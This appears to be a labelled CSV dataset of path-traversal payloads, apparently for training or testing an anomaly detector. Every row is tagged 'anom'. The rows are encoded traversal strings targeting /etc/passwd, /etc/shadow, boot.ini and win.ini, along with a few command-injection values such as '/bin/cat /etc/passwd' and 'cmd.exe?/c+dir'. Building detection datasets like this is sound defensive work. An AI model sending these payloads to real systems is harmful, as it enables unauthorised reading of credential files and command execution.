payload,length,attack_type,label
..\..\\\{FILE},14,path-traversal,anom
..\..\\..\\\{FILE},18,path-traversal,anom
..\..\\..\..\\\{FILE},21,path-traversal,anom
..\..\\..\..\\..\\\{FILE},25,path-traversal,anom
..\..\\..\..\\..\..\\\{FILE},28,path-traversal,anom
..\..\\..\..\\..\..\\..\\\{FILE},32,path-traversal,anom
..\..\\..\..\\..\..\\..\..\\\{FILE},35,path-traversal,anom
\..\WINDOWS\win.ini,19,path-traversal,anom
\..\..\WINDOWS\win.ini,22,path-traversal,anom
\..\..\..\WINDOWS\win.ini,25,path-traversal,anom
\..\..\..\..\WINDOWS\win.ini,28,path-traversal,anom
\..\..\..\..\..\WINDOWS\win.ini,31,path-traversal,anom
\..\..\..\..\..\..\WINDOWS\win.ini,34,path-traversal,anom
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,102,path-traversal,anom
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,93,path-traversal,anom
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,84,path-traversal,anom
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,75,path-traversal,anom
%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,66,path-traversal,anom
%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,57,path-traversal,anom
%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,48,path-traversal,anom
%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,238,path-traversal,anom
%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,217,path-traversal,anom
%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,196,path-traversal,anom
%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,175,path-traversal,anom
..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,46,path-traversal,anom
..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,51,path-traversal,anom
..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,56,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,61,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,66,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,71,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,76,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,162,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,153,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,144,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,135,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,126,path-traversal,anom
%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,117,path-traversal,anom
%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,108,path-traversal,anom
../../../../../../../../../etc/passwd,37,path-traversal,anom
../../../../../../../../etc/passwd,34,path-traversal,anom
../../../../../../../etc/passwd,31,path-traversal,anom
../../../../../../etc/passwd,28,path-traversal,anom
../../../../../etc/passwd,25,path-traversal,anom
../../../../etc/passwd,22,path-traversal,anom
../../../etc/passwd,19,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,111,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,102,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,93,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,84,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,75,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,66,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,57,path-traversal,anom
%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,48,path-traversal,anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,175,path-traversal,anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,154,path-traversal,anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,133,path-traversal,anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,112,path-traversal,anom
../../../.htaccess,18,path-traversal,anom
../../.htaccess,15,path-traversal,anom
../.htaccess,12,path-traversal,anom
.htaccess,9,path-traversal,anom
././.htaccess,13,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,54,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,45,path-traversal,anom
%2e%2e%2f%2e%68%74%61%63%63%65%73%73,36,path-traversal,anom
%2e%68%74%61%63%63%65%73%73,27,path-traversal,anom
%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73,39,path-traversal,anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,126,path-traversal,anom
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,105,path-traversal,anom
%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,84,path-traversal,anom
%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,63,path-traversal,anom
%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,91,path-traversal,anom
../../../../../../../../../../../../etc/hosts%00,48,path-traversal,anom
../../../../../../../../../../../../etc/hosts,45,path-traversal,anom
../../boot.ini,14,path-traversal,anom
/../../../../../../../../%2A,28,path-traversal,anom
../../../../../../../../../../../../etc/passwd%00,49,path-traversal,anom
../../../../../../../../../../../../etc/passwd,46,path-traversal,anom
../../../../../../../../../../../../etc/shadow%00,49,path-traversal,anom
../../../../../../../../../../../../etc/shadow,46,path-traversal,anom
/../../../../../../../../../../etc/passwd^^,43,path-traversal,anom
/../../../../../../../../../../etc/shadow^^,43,path-traversal,anom
/../../../../../../../../../../etc/passwd,41,path-traversal,anom
/../../../../../../../../../../etc/shadow,41,path-traversal,anom
/./././././././././././etc/passwd,33,path-traversal,anom
/./././././././././././etc/shadow,33,path-traversal,anom
\..\..\..\..\..\..\..\..\..\..\etc\passwd,41,path-traversal,anom
\..\..\..\..\..\..\..\..\..\..\etc\shadow,41,path-traversal,anom
..\..\..\..\..\..\..\..\..\..\etc\passwd,40,path-traversal,anom
..\..\..\..\..\..\..\..\..\..\etc\shadow,40,path-traversal,anom
/..\../..\../..\../..\../..\../..\../etc/passwd,47,path-traversal,anom
/..\../..\../..\../..\../..\../..\../etc/shadow,47,path-traversal,anom
.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,40,path-traversal,anom
.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow,40,path-traversal,anom
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,44,path-traversal,anom
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,44,path-traversal,anom
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,43,path-traversal,anom
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,43,path-traversal,anom
%0a/bin/cat%20/etc/passwd,25,path-traversal,anom
%0a/bin/cat%20/etc/shadow,25,path-traversal,anom
%00/etc/passwd%00,17,path-traversal,anom
%00/etc/shadow%00,17,path-traversal,anom
%00../../../../../../etc/passwd,31,path-traversal,anom
%00../../../../../../etc/shadow,31,path-traversal,anom
/../../../../../../../../../../../etc/passwd%00.jpg,51,path-traversal,anom
/../../../../../../../../../../../etc/passwd%00.html,52,path-traversal,anom
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,77,path-traversal,anom
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,77,path-traversal,anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,81,path-traversal,anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,81,path-traversal,anom
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,115,path-traversal,anom
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,116,path-traversal,anom
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,97,path-traversal,anom
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,130,path-traversal,anom
\\&apos;/bin/cat%20/etc/passwd\\&apos;,38,path-traversal,anom
\\&apos;/bin/cat%20/etc/shadow\\&apos;,38,path-traversal,anom
../../../../../../../../conf/server.xml,39,path-traversal,anom
/../../../../../../../../bin/id|,32,path-traversal,anom
C:/inetpub/wwwroot/global.asa,29,path-traversal,anom
C:\inetpub\wwwroot\global.asa,29,path-traversal,anom
C:/boot.ini,11,path-traversal,anom
C:\boot.ini,11,path-traversal,anom
../../../../../../../../../../../../localstart.asp%00,53,path-traversal,anom
../../../../../../../../../../../../localstart.asp,50,path-traversal,anom
../../../../../../../../../../../../boot.ini%00,47,path-traversal,anom
../../../../../../../../../../../../boot.ini,44,path-traversal,anom
/./././././././././././boot.ini,31,path-traversal,anom
/../../../../../../../../../../../boot.ini%00,45,path-traversal,anom
/../../../../../../../../../../../boot.ini,42,path-traversal,anom
/..\../..\../..\../..\../..\../..\../boot.ini,45,path-traversal,anom
/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini,39,path-traversal,anom
\..\..\..\..\..\..\..\..\..\..\boot.ini,39,path-traversal,anom
..\..\..\..\..\..\..\..\..\..\boot.ini%00,41,path-traversal,anom
..\..\..\..\..\..\..\..\..\..\boot.ini,38,path-traversal,anom
/../../../../../../../../../../../boot.ini%00.html,50,path-traversal,anom
/../../../../../../../../../../../boot.ini%00.jpg,49,path-traversal,anom
/.../.../.../.../.../,21,path-traversal,anom
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,74,path-traversal,anom
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,79,path-traversal,anom
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,45,path-traversal,anom
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,52,path-traversal,anom
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,59,path-traversal,anom
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,66,path-traversal,anom
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd,55,path-traversal,anom
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd,64,path-traversal,anom
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd,73,path-traversal,anom
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd,82,path-traversal,anom
..//etc/passwd,14,path-traversal,anom
../..//etc/passwd,17,path-traversal,anom
../../..//etc/passwd,20,path-traversal,anom
../../../..//etc/passwd,23,path-traversal,anom
../../../../..//etc/passwd,26,path-traversal,anom
../../../../../..//etc/passwd,29,path-traversal,anom
../../../../../../..//etc/passwd,32,path-traversal,anom
../../../../../../../..//etc/passwd,35,path-traversal,anom
..%2f/etc/passwd,16,path-traversal,anom
..%2f..%2f/etc/passwd,21,path-traversal,anom
..%2f..%2f..%2f/etc/passwd,26,path-traversal,anom
..%2f..%2f..%2f..%2f/etc/passwd,31,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f/etc/passwd,36,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,41,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,46,path-traversal,anom
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd,51,path-traversal,anom
%2e%2e//etc/passwd,18,path-traversal,anom
%2e%2e/%2e%2e//etc/passwd,25,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e//etc/passwd,32,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,39,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,46,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,53,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,60,path-traversal,anom
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd,67,path-traversal,anom
%2e%2e%2f/etc/passwd,20,path-traversal,anom
%2e%2e%2f%2e%2e%2f/etc/passwd,29,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,38,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,47,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,56,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,65,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,74,path-traversal,anom
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd,83,path-traversal,anom
..%252f/etc/passwd,18,path-traversal,anom
..%252f..%252f/etc/passwd,25,path-traversal,anom
..%252f..%252f..%252f/etc/passwd,32,path-traversal,anom
..%252f..%252f..%252f..%252f/etc/passwd,39,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f/etc/passwd,46,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd,53,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd,60,path-traversal,anom
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd,67,path-traversal,anom
%252e%252e//etc/passwd,22,path-traversal,anom
%252e%252e/%252e%252e//etc/passwd,33,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e//etc/passwd,44,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd,55,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd,66,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd,77,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd,88,path-traversal,anom
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd,99,path-traversal,anom
%252e%252e%252f/etc/passwd,26,path-traversal,anom
%252e%252e%252f%252e%252e%252f/etc/passwd,41,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,56,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,71,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,86,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,101,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,116,path-traversal,anom
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,131,path-traversal,anom
..\/etc/passwd,14,path-traversal,anom
..\..\/etc/passwd,17,path-traversal,anom
..\..\..\/etc/passwd,20,path-traversal,anom
..\..\..\..\/etc/passwd,23,path-traversal,anom
..\..\..\..\..\/etc/passwd,26,path-traversal,anom
..\..\..\..\..\..\/etc/passwd,29,path-traversal,anom
..\..\..\..\..\..\..\/etc/passwd,32,path-traversal,anom
..\..\..\..\..\..\..\..\/etc/passwd,35,path-traversal,anom
..%255c/etc/passwd,18,path-traversal,anom
..%255c..%255c/etc/passwd,25,path-traversal,anom
..%255c..%255c..%255c/etc/passwd,32,path-traversal,anom
..%255c..%255c..%255c..%255c/etc/passwd,39,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c/etc/passwd,46,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd,53,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd,60,path-traversal,anom
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd,67,path-traversal,anom
%252e%252e\/etc/passwd,22,path-traversal,anom
%252e%252e\%252e%252e\/etc/passwd..%5c/etc/passwd,49,path-traversal,anom
..%5c..%5c/etc/passwd,21,path-traversal,anom
..%5c..%5c..%5c/etc/passwd,26,path-traversal,anom
..%5c..%5c..%5c..%5c/etc/passwd,31,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c/etc/passwd,36,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd,41,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd,46,path-traversal,anom
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd,51,path-traversal,anom
%2e%2e\/etc/passwd,18,path-traversal,anom
%2e%2e\%2e%2e\/etc/passwd,25,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\/etc/passwd,32,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd,39,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd,46,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd,53,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd,60,path-traversal,anom
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd,67,path-traversal,anom
%2e%2e%5c/etc/passwd,20,path-traversal,anom
%2e%2e%5c%2e%2e%5c/etc/passwd,29,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,38,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,47,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,56,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,65,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,74,path-traversal,anom
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd,83,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\/etc/passwd,44,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd,55,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd,66,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd,77,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd,88,path-traversal,anom
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd,99,path-traversal,anom
%252e%252e%255c/etc/passwd,26,path-traversal,anom
%252e%252e%255c%252e%252e%255c/etc/passwd,41,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd,56,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd,71,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd,86,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd,101,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd,116,path-traversal,anom
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd,131,path-traversal,anom
..%c0%af/etc/passwd,19,path-traversal,anom
..%c0%af..%c0%af/etc/passwd,27,path-traversal,anom
..%c0%af..%c0%af..%c0%af/etc/passwd,35,path-traversal,anom
..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd,43,path-traversal,anom
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd,51,path-traversal,anom
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd,59,path-traversal,anom
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd,67,path-traversal,anom
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd,75,path-traversal,anom
%c0%ae%c0%ae//etc/passwd,24,path-traversal,anom
%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd,37,path-traversal,anom
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd,50,path-traversal,anom
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd,63,path-traversal,anom
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd,76,path-traversal,anom
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd,89,path-traversal,anom
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd,102,path-traversal,anom
